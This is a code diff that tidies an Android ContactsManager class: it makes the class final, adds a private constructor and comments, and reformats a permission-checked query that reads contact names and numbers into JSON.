@@ -10,8 +10,12 @@ import com.fason.app.core.permissions.PermissionManager;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-public class ContactsManager {
+// Contacts manager
+public final class ContactsManager {
 
+    private ContactsManager() {}
+
+    // Get contacts list
     public static JSONObject getContacts() {
         JSONObject result = new JSONObject();
         JSONArray list = new JSONArray();
@@ -19,7 +23,6 @@ public class ContactsManager {
         try {
             result.put("contactsList", list);
 
-            // Check permission
             if (!PermissionManager.canIUse(Manifest.permission.READ_CONTACTS)) {
                 result.put("error", "Permission denied");
                 return result;
@@ -28,7 +31,8 @@ public class ContactsManager {
             Cursor cur = FasonApp.getContext().getContentResolver().query(
                 Phone.CONTENT_URI,
                 new String[]{Phone.DISPLAY_NAME, Phone.NUMBER},
-                null, null, Phone.DISPLAY_NAME + " ASC");
+                null, null,
+                Phone.DISPLAY_NAME + " ASC");
 
             if (cur != null) {
                 int nameIdx = cur.getColumnIndex(Phone.DISPLAY_NAME);
